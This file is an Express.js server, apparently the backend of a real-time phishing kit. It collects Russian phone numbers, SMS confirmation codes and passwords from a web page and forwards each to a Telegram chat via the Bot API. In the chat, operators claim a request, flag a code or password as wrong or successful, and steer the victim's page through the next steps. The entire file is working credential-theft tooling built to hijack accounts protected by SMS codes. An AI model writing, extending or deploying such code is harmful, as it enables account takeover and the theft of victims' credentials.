require("dotenv").config();

const express = require("express");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const requestStates = new Map();
let telegramOffset = 0;
let isPollingTelegram = false;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

const ensureTelegramConfigured = () => {
  if (!botToken || !chatId) {
    const error = new Error("Не настроены TELEGRAM_BOT_TOKEN или TELEGRAM_CHAT_ID");
    error.statusCode = 500;
    throw error;
  }
};

const callTelegramApi = async (method, payload) => {
  ensureTelegramConfigured();

  const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });

  const result = await response.json();
  if (!response.ok || !result.ok) {
    throw new Error(result.description || "Telegram API error");
  }

  return result.result;
};

const formatTelegramUserTag = (user) => {
  if (!user) {
    return "unknown";
  }

  if (user.username) {
    return `@${user.username}`;
  }

  const fullName = [user.first_name, user.last_name].filter(Boolean).join(" ").trim();
  return fullName || `id:${user.id}`;
};

const buildPhoneMessageText = (requestId, phone, takenBy = "") => {
  const lines = [`ID: ${requestId}`, `📞 Новый номер: ${phone}`];

  if (takenBy) {
    lines.push(`Взял: ${takenBy}`);
  }

  return lines.join("\n");
};

const buildSmsMessageText = (requestId, code, phone, takenBy = "", isSuccess = false) => {
  const lines = [];

  if (isSuccess) {
    lines.push("✅ Успех");
  }

  lines.push(`ID: ${requestId}`);
  lines.push(`📩 Код подтверждения: ${code}`);
  lines.push(`📞 Номер: ${phone}`);

  if (takenBy) {
    lines.push(`Взял: ${takenBy}`);
  }

  return lines.join("\n");
};

const buildNameMessageText = (requestId, name, phone, takenBy = "", isSuccess = false) => {
  const lines = [];

  if (isSuccess) {
    lines.push("✅ Успех");
  }

  lines.push(`ID: ${requestId}`);
  lines.push(`🪪 Пароль: ${name}`);

  if (phone) {
    lines.push(`📞 Номер: ${phone}`);
  }

  if (takenBy) {
    lines.push(`Взял: ${takenBy}`);
  }

  return lines.join("\n");
};

const buildPhoneKeyboard = (requestId, status) => {
  if (status === "taken") {
    return {
      inline_keyboard: [[{ text: "Код", callback_data: `next:${requestId}` }]]
    };
  }

  if (status === "ready") {
    return {
      inline_keyboard: []
    };
  }

  return {
    inline_keyboard: [[{ text: "Взять", callback_data: `take:${requestId}` }]]
  };
};

const buildSmsKeyboard = (requestId) => ({
  inline_keyboard: [[
    { text: "Неверный код", callback_data: `wrongcode:${requestId}` },
    { text: "Успех", callback_data: `smssuccess:${requestId}` },
    { text: "Пароль", callback_data: `name:${requestId}` }
  ]]
});

const buildNameKeyboard = (requestId) => ({
  inline_keyboard: [[
    { text: "Неверный пароль", callback_data: `wrongpassword:${requestId}` },
    { text: "Успех", callback_data: `passwordsuccess:${requestId}` }
  ]]
});

const sendTelegramMessage = async (text, replyMarkup) => {
  return callTelegramApi("sendMessage", {
    chat_id: chatId,
    text,
    reply_markup: replyMarkup
  });
};

const editTelegramMessage = async (requestState) => {
  if (!requestState?.messageId) {
    return;
  }

  return callTelegramApi("editMessageText", {
    chat_id: chatId,
    message_id: requestState.messageId,
    text: buildPhoneMessageText(requestState.requestId, requestState.phone, requestState.takenBy),
    reply_markup: buildPhoneKeyboard(requestState.requestId, requestState.status)
  });
};

const editSmsTelegramMessage = async (requestState) => {
  if (!requestState?.codeMessageId || !requestState.lastCode) {
    return;
  }

  return callTelegramApi("editMessageText", {
    chat_id: chatId,
    message_id: requestState.codeMessageId,
    text: buildSmsMessageText(
      requestState.requestId,
      requestState.lastCode,
      requestState.phone,
      requestState.takenBy,
      Boolean(requestState.smsSuccess)
    ),
    reply_markup: buildSmsKeyboard(requestState.requestId)
  });
};

const editNameTelegramMessage = async (requestState) => {
  if (!requestState?.nameMessageId || !requestState.lastName) {
    return;
  }

  return callTelegramApi("editMessageText", {
    chat_id: chatId,
    message_id: requestState.nameMessageId,
    text: buildNameMessageText(
      requestState.requestId,
      requestState.lastName,
      requestState.phone,
      requestState.takenBy,
      Boolean(requestState.passwordSuccess)
    ),
    reply_markup: buildNameKeyboard(requestState.requestId)
  });
};

const answerCallbackQuery = async (callbackQueryId, text) => {
  return callTelegramApi("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text
  });
};

const canManageRequest = (requestState, callbackQuery) => {
  return !requestState.takenByUserId || requestState.takenByUserId === callbackQuery.from.id;
};

const handleTakeAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (requestState.status === "ready" || requestState.status === "name") {
    await answerCallbackQuery(callbackQuery.id, "По этой заявке уже продолжили");
    return;
  }

  if (requestState.status === "taken") {
    if (requestState.takenByUserId === callbackQuery.from.id) {
      await answerCallbackQuery(callbackQuery.id, "Заявка уже у вас");
    } else {
      await answerCallbackQuery(callbackQuery.id, "Заявка уже взята");
    }
    return;
  }

  requestState.status = "taken";
  requestState.takenBy = formatTelegramUserTag(callbackQuery.from);
  requestState.takenByUserId = callbackQuery.from.id;
  requestState.updatedAt = Date.now();

  await editTelegramMessage(requestState);
  await answerCallbackQuery(callbackQuery.id, "Заявка отмечена");
};

const handleNextAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (requestState.status === "pending") {
    await answerCallbackQuery(callbackQuery.id, "Сначала нажмите Взять в телеграме");
    return;
  }

  if (!canManageRequest(requestState, callbackQuery)) {
    await answerCallbackQuery(callbackQuery.id, "Продолжить может только тот, кто взял заявку");
    return;
  }

  requestState.status = "ready";
  requestState.updatedAt = Date.now();

  await editTelegramMessage(requestState);
  await answerCallbackQuery(callbackQuery.id, "Можно переходить дальше");
};

const handleWrongCodeAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (!canManageRequest(requestState, callbackQuery)) {
    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
    return;
  }

  requestState.codeErrorCount = (requestState.codeErrorCount || 0) + 1;
  requestState.updatedAt = Date.now();

  await answerCallbackQuery(callbackQuery.id, "Неверный код");
};

const handleSmsSuccessAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (!canManageRequest(requestState, callbackQuery)) {
    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
    return;
  }

  if (!requestState.codeMessageId || !requestState.lastCode) {
    await answerCallbackQuery(callbackQuery.id, "SMS сообщение не найдено");
    return;
  }

  requestState.smsSuccess = true;
  requestState.updatedAt = Date.now();

  await editSmsTelegramMessage(requestState);
  await answerCallbackQuery(callbackQuery.id, "Успех отмечен");
};

const handleNameAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (!canManageRequest(requestState, callbackQuery)) {
    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
    return;
  }

  requestState.status = "name";
  requestState.updatedAt = Date.now();

  await answerCallbackQuery(callbackQuery.id, "Открыт экран имени");
};

const handleWrongPasswordAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (!canManageRequest(requestState, callbackQuery)) {
    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
    return;
  }

  requestState.passwordErrorCount = (requestState.passwordErrorCount || 0) + 1;
  requestState.updatedAt = Date.now();

  await answerCallbackQuery(callbackQuery.id, "Неверный пароль");
};

const handlePasswordSuccessAction = async (requestId, callbackQuery) => {
  const requestState = requestStates.get(requestId);

  if (!requestState) {
    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
    return;
  }

  if (!canManageRequest(requestState, callbackQuery)) {
    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
    return;
  }

  if (!requestState.nameMessageId || !requestState.lastName) {
    await answerCallbackQuery(callbackQuery.id, "Сообщение с паролем не найдено");
    return;
  }

  requestState.passwordSuccess = true;
  requestState.updatedAt = Date.now();

  await editNameTelegramMessage(requestState);
  await answerCallbackQuery(callbackQuery.id, "Успех отмечен");
};

const handleTelegramUpdate = async (update) => {
  const callbackQuery = update.callback_query;
  if (!callbackQuery?.data) {
    return;
  }

  const [action, requestId] = callbackQuery.data.split(":");
  if (!action || !requestId) {
    await answerCallbackQuery(callbackQuery.id, "Некорректная команда");
    return;
  }

  if (action === "take") {
    await handleTakeAction(requestId, callbackQuery);
    return;
  }

  if (action === "next") {
    await handleNextAction(requestId, callbackQuery);
    return;
  }

  if (action === "wrongcode") {
    await handleWrongCodeAction(requestId, callbackQuery);
    return;
  }

  if (action === "smssuccess") {
    await handleSmsSuccessAction(requestId, callbackQuery);
    return;
  }

  if (action === "name") {
    await handleNameAction(requestId, callbackQuery);
    return;
  }

  if (action === "wrongpassword") {
    await handleWrongPasswordAction(requestId, callbackQuery);
    return;
  }

  if (action === "passwordsuccess") {
    await handlePasswordSuccessAction(requestId, callbackQuery);
  }
};

const pollTelegramUpdates = async () => {
  if (isPollingTelegram || !botToken) {
    return;
  }

  isPollingTelegram = true;

  try {
    const updates = await callTelegramApi("getUpdates", {
      offset: telegramOffset,
      timeout: 0,
      allowed_updates: ["callback_query"]
    });

    for (const update of updates) {
      telegramOffset = update.update_id + 1;
      await handleTelegramUpdate(update);
    }
  } catch (error) {
    console.error("Telegram polling error:", error.message);
  } finally {
    isPollingTelegram = false;
  }
};

app.post("/api/send-phone", async (req, res) => {
  const { phone, requestId } = req.body || {};

  if (!phone || !/^\+7\d{10}$/.test(phone)) {
    return res.status(400).json({ error: "Некорректный номер телефона" });
  }

  if (!requestId || typeof requestId !== "string") {
    return res.status(400).json({ error: "Некорректный ID запроса" });
  }

  try {
    const message = await sendTelegramMessage(
      buildPhoneMessageText(requestId, phone),
      buildPhoneKeyboard(requestId, "pending")
    );

    requestStates.set(requestId, {
      requestId,
      phone,
      status: "pending",
      takenBy: "",
      takenByUserId: null,
      messageId: message.message_id,
      codeMessageId: null,
      nameMessageId: null,
      lastCode: "",
      lastName: "",
      smsSuccess: false,
      passwordSuccess: false,
      codeErrorCount: 0,
      passwordErrorCount: 0,
      updatedAt: Date.now()
    });

    res.json({ ok: true });
  } catch (error) {
    res.status(error.statusCode || 500).json({ error: "Ошибка отправки в Telegram" });
  }
});

app.get("/api/request-status", (req, res) => {
  const { requestId } = req.query || {};

  if (!requestId || typeof requestId !== "string") {
    return res.status(400).json({ error: "Некорректный ID запроса" });
  }

  const requestState = requestStates.get(requestId);
  if (!requestState) {
    return res.status(404).json({ error: "Заявка не найдена" });
  }

  res.json({
    ok: true,
    status: requestState.status,
    takenBy: requestState.takenBy,
    codeErrorCount: requestState.codeErrorCount || 0,
    passwordErrorCount: requestState.passwordErrorCount || 0
  });
});

app.post("/api/send-code", async (req, res) => {
  const { phone, code, requestId } = req.body || {};

  if (!phone || !/^\+7\d{10}$/.test(phone)) {
    return res.status(400).json({ error: "Некорректный номер телефона" });
  }

  if (!code || !/^\d{6}$/.test(code)) {
    return res.status(400).json({ error: "Некорректный код подтверждения" });
  }

  if (!requestId || typeof requestId !== "string") {
    return res.status(400).json({ error: "Некорректный ID запроса" });
  }

  const requestState = requestStates.get(requestId);

  try {
    const message = await sendTelegramMessage(
      buildSmsMessageText(requestId, code, phone, requestState?.takenBy || "", false),
      buildSmsKeyboard(requestId)
    );

    if (requestState) {
      requestState.codeMessageId = message.message_id;
      requestState.lastCode = code;
      requestState.smsSuccess = false;
      requestState.updatedAt = Date.now();
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(error.statusCode || 500).json({ error: "Ошибка отправки в Telegram" });
  }
});

app.post("/api/send-name", async (req, res) => {
  const { requestId, name, phone } = req.body || {};

  if (!requestId || typeof requestId !== "string") {
    return res.status(400).json({ error: "Некорректный ID запроса" });
  }

  if (!name || typeof name !== "string" || !name.trim()) {
    return res.status(400).json({ error: "Некорректный пароль" });
  }

  const requestState = requestStates.get(requestId);

  try {
    const message = await sendTelegramMessage(
      buildNameMessageText(requestId, name.trim(), phone || requestState?.phone || "", requestState?.takenBy || "", false),
      buildNameKeyboard(requestId)
    );

    if (requestState) {
      requestState.lastName = name.trim();
      requestState.nameMessageId = message.message_id;
      requestState.passwordSuccess = false;
      requestState.updatedAt = Date.now();
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(error.statusCode || 500).json({ error: "Ошибка отправки в Telegram" });
  }
});

app.listen(port, () => {
  console.log(`Server started on http://localhost:${port}`);
});

pollTelegramUpdates();
setInterval(pollTelegramUpdates, 2000);
